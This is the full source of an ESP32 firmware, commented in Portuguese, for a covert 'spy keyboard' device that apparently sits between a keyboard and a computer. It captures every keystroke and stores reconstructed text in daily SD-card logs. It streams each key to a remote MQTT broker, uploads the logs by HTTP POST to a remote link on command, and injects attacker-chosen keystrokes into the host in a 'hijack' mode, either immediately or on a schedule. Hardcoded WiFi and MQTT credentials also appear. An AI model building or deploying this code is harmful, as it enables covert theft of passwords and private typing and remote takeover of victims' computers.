#include <Arduino.h>
#include <WiFi.h>
#include <WiFiClientSecure.h>
#include <HTTPClient.h>
#include <SD_MMC.h>
#include <MQTT.h>
#include <ArduinoJson.h>
#include <iostream>
#include <stdlib.h>
#include <string.h>
#include "time.h"
#include "certificados.h"

String idDoMeuBeacon = "fda50693-a4e2-4fb1-afcf-c6eb07647825";

typedef struct agendamentos {
  char nome[15];
  struct agendamentos* prox;
} Agendamentos;

String wifi = "Projeto";
String senha = "2022-11-07";
String buffer = "";
struct tm tempoAtual;
int min_anterior;
int dia_anterior;
char log_name[18];
Agendamentos* agenda;
Agendamentos* agendaAux;
String rotina = "";
unsigned long delayRotina = 0;

WiFiClientSecure conexaoSegura;
MQTTClient mqtt(1000000);

String vetorString[] = {"Tab", "Caps_lock", "Ctrl", "Alt", "Windows", "Num_lock", "Space_key", "Esc", "Enter",
"Backspace", "Delete", "F1", "F2", "F3" , "F4", "F5", "F6", "F7", "F8", "F9", "F10", "F11", "F12"};

bool modo_hacker = false;

unsigned long lastMillis = 0;
bool do_delay = true;

String key = "";

int delay_end;
bool log_sync_end = 0;

const char* ntpServer = "pool.ntp.org";
long gmtOffset_sec = -10800;
int daylightOffset_sec = 0;

int atualizaTempo(void);
void gera_log_name(void);
void append_log(char log_atual[], String* buffer);
void cria_novo_log(void);
void connect(void);
void messageReceived(String& topic, String& payload);
void ler_agendamentos(void);
void verifica_rotinas(void);

void setup() {
  Serial.begin(115200);
  Serial2.begin(9600, SERIAL_8N1, 16, 17); //TX:17 RX:16
  delay(500);
  SD_MMC.setPins(39, 38, 40);
  if (!SD_MMC.begin("/sdcard", true)) {
    Serial.println("Falha na inicialização do cartão SD.");
    while (true) {
    };  // trava programa aqui
  }

  Serial.println("SD Card ok!");

  conexaoSegura.setCACert(certificado1);
  
  mqtt.begin("mqtt.janks.dev.br", 8883, conexaoSegura);
  mqtt.onMessage(messageReceived);

  mqtt.setTimeout(20000000);
  mqtt.setKeepAlive(20000000);

  connect();

  if (!atualizaTempo()) {
    Serial.println("Falha na inicialização do tempo.");
    while (true) {};
  }
  min_anterior = tempoAtual.tm_min;
  dia_anterior = tempoAtual.tm_mday;
  Serial.print("Hora do dia: ");
  Serial.println(&tempoAtual, "%d-%b-%Y %H:%M:%S");

  cria_novo_log();
  ler_agendamentos();
}

void loop() {
  mqtt.loop();
  if ((!mqtt.connected()) || (WiFi.status() != WL_CONNECTED)) {
    connect();
  }
  atualizaTempo();

  if (log_sync_end){
    log_sync_end = !log_sync_end;
    Serial.println("sync terminou");
    mqtt.publish("teclado_espiao/command_response", "Sync terminado.");
  }

  if (Serial2.available()){ 
    int debug = Serial2.read(); 
    if (debug == 240) return;
    key += (char)debug;
    if (key.endsWith("\n")){
        key = "";
    }
    else if (key.endsWith(";;")){
        int isIn = 0;
        for (int i = 0; i < 23; i++) if (key.startsWith(vetorString[i]) && !key.startsWith("Space_key") && !key.startsWith("Backspace")) isIn = 1;
        if (!isIn && key.endsWith("p;;")) {
            if (key.startsWith("Space_key")) buffer += " ";
            else if (key.startsWith("Backspace") && !buffer.isEmpty()) buffer = buffer.substring(0, buffer.length() - 1);
            else buffer += key[0];
        }
        mqtt.publish("teclado_espiao/teclas_out", key);
        key = "";
    }
  }

  if (tempoAtual.tm_min > min_anterior) {
    append_log(log_name, &buffer);
    min_anterior = tempoAtual.tm_min;
  }

  if (tempoAtual.tm_mday > dia_anterior) {
    cria_novo_log();
    dia_anterior = tempoAtual.tm_mday;
  }

  verifica_rotinas();

  if (!rotina.isEmpty() && millis() >= delayRotina) {
    if (!modo_hacker){
      mqtt.publish("teclado_espiao/command_response", "Rotina iniciada.");
      Serial2.println("hijack on\n");
    }
    modo_hacker = 1;

    if (do_delay){
        delay_end = rotina.indexOf("'", 2);
        String delay_tempo = rotina.substring(2, delay_end);
        delayRotina = millis() + atoi(delay_tempo.c_str());
        do_delay = !do_delay;
        return;
    }

    int tecla_start = rotina.indexOf("'", delay_end + 1) + 1;
    int tecla_end = rotina. indexOf("'", tecla_start);
    String tecla = rotina.substring(tecla_start, tecla_end);
    int tipo_start = rotina.indexOf("'", tecla_end + 1) + 1;
    String tecla_tipo = rotina.substring(tipo_start, tipo_start + 1);

    String resposta = tecla + " " + tecla_tipo + ";;";
    Serial2.println(resposta);
    mqtt.publish("teclado_espiao/teclas_out", resposta);

    rotina = rotina.substring(rotina.indexOf(")") + 2);

    do_delay = !do_delay;
    
    if (rotina.isEmpty()){
      mqtt.publish("teclado_espiao/command_response", "Rotina terminada.");
      Serial2.println("hijack off\n");
      modo_hacker = 0;
    }
  }
}

int atualizaTempo(void) {
  if (!getLocalTime(&tempoAtual)) {
    Serial.println("Erro ao coletar tempo.");
    return 0;
  }
  return 1;
}

void gera_log_name(void) {
  memset(log_name, 0, sizeof(log_name));
  strcat(log_name, "/log_");
  char log_aux[9];
  strftime(log_aux, 9, "%y_%m_%d", &tempoAtual);
  strcat(log_name, log_aux);
  strcat(log_name, ".txt");
}

void append_log(char log_atual[], String* buffer) {
  File log = SD_MMC.open(log_atual, FILE_APPEND);
  if (log.print(*buffer)) {
    Serial.println("\nBuffer adicionado ao arquivo.\n");
  }
  log.close();
  *buffer = "";
}

void cria_novo_log(void) {
  gera_log_name();
  if (SD_MMC.exists(log_name)) {
    return;
  }
  
  File log = SD_MMC.open(log_name, FILE_WRITE);
  if (!log) {
    Serial.println("Erro ao criar log inicial.");
    while (true) {};
  }
  log.close();
}

void connect() {
  WiFi.begin(wifi, senha);
  Serial.print("Conectando ao WiFi.");
  while (WiFi.status() != WL_CONNECTED) {
    delay(250);
    Serial.print(".");
  }
  Serial.println("\nWiFi Conectado.");

  configTime(gmtOffset_sec, daylightOffset_sec, ntpServer);
  
  Serial.print("\nConectando ao mqtt..."); 
  while (!mqtt.connect("fa89y6guai38", "aula", "zowmad-tavQez")) {
    Serial.print(".");
    delay(250);
  }

  Serial.println("\nMQTT Conectado!");

  mqtt.subscribe("teclado_espiao/teclas_in");
  mqtt.subscribe("teclado_espiao/command_request");
}

void messageReceived(String& topic, String& payload) {
  Serial.println("Tópico recebido: "+ topic);
  if (topic == "teclado_espiao/teclas_in") {
    Serial2.println(payload);
  } else if (topic == "teclado_espiao/command_request") {
    String comando = "";
    while (payload.begin()[0] != ' ') {
      comando += payload.begin()[0];
      payload = payload.substring(1);
      if (payload.isEmpty()) break;
    }
    payload = payload.substring(1);
    if (comando == "CHANGE_MODE") {
      mqtt.publish("teclado_espiao/command_response", "Modo hacker alterado.");
      modo_hacker = !modo_hacker;
      if (modo_hacker) Serial2.println("hijack on\n");
      else Serial2.println("hijack off\n");
    }
    else if (comando == "SCHEDULE") {  // nome: aa-mm-dd_hh-mm
      String tempo_atual;
      char strAux[15];
      strftime(strAux, 15, "%y-%m-%d_%H-%M", &tempoAtual);
      tempo_atual = strAux;
      String nome = payload.substring(0, 14);
      if (nome < tempo_atual) return;
      String conteudo = payload.substring(15);
      if (!agenda) {
        agenda = (Agendamentos*)malloc(sizeof(Agendamentos));
        if (!agenda) {
          Serial.println("Erro ao alocar memória para o primeiro agendamento.");
          return;
        }
        strcpy(agenda->nome, nome.c_str());
        agenda->prox = NULL;
      } else {
        agendaAux = agenda;
        while (agendaAux->prox) {
          agendaAux = agendaAux->prox;
        }
        agendaAux->prox = (Agendamentos*)malloc(sizeof(Agendamentos));
        if (!agendaAux->prox) {
          Serial.println("Erro ao alocar memória para novo agendamento.");
          return;
        }
        strcpy(agendaAux->prox->nome, nome.c_str());
        agendaAux->prox->prox = NULL;
      }

      File arq = SD_MMC.open("/agendamentos/" + nome, FILE_WRITE);
      if (!arq) {
        Serial.println("Erro ao escrever agendamento");
      }

      if (arq.print(conteudo)) {
        Serial.println("File written");
      } else {
        Serial.println("Write failed");
      }
      arq.close();
      mqtt.publish("teclado_espiao/command_response", "Agendamento recebido.");
    }
    else if (comando == "ROUTINE"){
      rotina = payload;
      mqtt.publish("teclado_espiao/command_response", "Rotina recebida.");
    }
    else if (comando == "SYNC_LOG"){
      mqtt.publish("teclado_espiao/command_response", "Sync iniciado.");
      String link = payload;
      JsonDocument dados;
      String conteudo = "";
      String tempo_atual;
      char strAux[15];
      strftime(strAux, 9, "%y_%m_%d", &tempoAtual);
      tempo_atual = "log_" + (String) strAux;

      File root = SD_MMC.open("/");
      if(!root){
        Serial.println("Failed to open directory");
        return;
      }
      if(!root.isDirectory()){
        Serial.println("Not a directory");
        return;
      }

      File file = root.openNextFile();
      while(file){
        if(!file.isDirectory()){
          String nome_log = (String) file.name();
          dados["date"] = nome_log.substring(4, 6) + "/" + nome_log.substring(7, 9) + "/" + nome_log.substring(10, 12);
          String dadosString;
          while (file.available()) {
            conteudo += (char) file.read();
          }
          dados["file"] = conteudo; 
          conteudo = "";
          serializeJson(dados, dadosString);

          String enderecoMensagemTexto = link + "/log/register/";
          HTTPClient requisicao;
          requisicao.begin(conexaoSegura, enderecoMensagemTexto);
          requisicao.addHeader("ngrok-skip-browser-warning", "aa");
          requisicao.addHeader("Content-Type", "application/json"); 
          int response = requisicao.POST(dadosString);
          if (response != 201){
            Serial.println("Erro no POST.");
          }

          //SD_MMC.remove(file.path());
        }
        file.close();
        file = root.openNextFile();
      }
      log_sync_end = 1;
    }
  }
}

void ler_agendamentos(void) {
  String tempo_atual;
  int i = 0;
  char strAux[15];
  strftime(strAux, 15, "%y-%m-%d_%H-%M", &tempoAtual);
  tempo_atual = strAux;

  File root = SD_MMC.open("/agendamentos");
  if (!root) {
    Serial.println("Erro ao abrir diretorio");
    return;
  }
  if (!root.isDirectory()) {
    Serial.println("Not a directory");
    return;
  }

  File file = root.openNextFile();

  while (file) {
    while (file.isDirectory()) {
      file = root.openNextFile();
    }

    String name = file.name();
    char nome[15];
    strcpy(nome, name.c_str());
    if (strcmp(nome, strAux) == 1) {
      Agendamentos* novoAgendamento = (Agendamentos*)malloc(sizeof(Agendamentos));
      strcpy(novoAgendamento->nome, name.c_str());
      novoAgendamento->prox = NULL;  // Inicializar próximo como NULL

      if (i == 0) {  // Primeiro agendamento
        agenda = novoAgendamento;
        agendaAux = agenda;
      } else {  // Adicionar ao final da lista
        agendaAux->prox = novoAgendamento;
        agendaAux = agendaAux->prox;
      }
      i++;
    } else {
      SD_MMC.remove("/agendamentos/" + name);
    }

    file = root.openNextFile();
  }
}

void verifica_rotinas(void) {
  agendaAux = agenda;
  Agendamentos* agendaAnt = agenda;
  int i = 0;
  char tempo_atual[15];
  strftime(tempo_atual, 15, "%y-%m-%d_%H-%M", &tempoAtual);

  while (agendaAux) {
    if (strcmp(agendaAux->nome, tempo_atual) <= 0) break;
    if (i > 0) agendaAnt = agendaAnt->prox;
    agendaAux = agendaAux->prox;
    i++;
  }
  if (agendaAux) {
    char caminhoCompleto[29] = "/agendamentos/";
    strcat(caminhoCompleto, agendaAux->nome);
    if (SD_MMC.exists(caminhoCompleto)) {
      File inputFile = SD_MMC.open(caminhoCompleto, FILE_READ);
      if (!inputFile) {
        Serial.println("Falha ao abrir o arquivo txt.");
      } else {
        String jsonString = inputFile.readString();
        rotina = jsonString;
        inputFile.close();
        SD_MMC.remove(caminhoCompleto);
        Serial.printf("Arquivo %s removido após leitura\n", agendaAux->nome);
      }
    } else {
      Serial.printf("Arquivo %s não encontrado para leitura\n", agendaAux->nome);
    }

    if (agendaAux == agenda) {
      agenda = agenda->prox;
      free(agendaAux);
    } else {
      agendaAnt->prox = agendaAux->prox;
      free(agendaAux);
    }
  }
}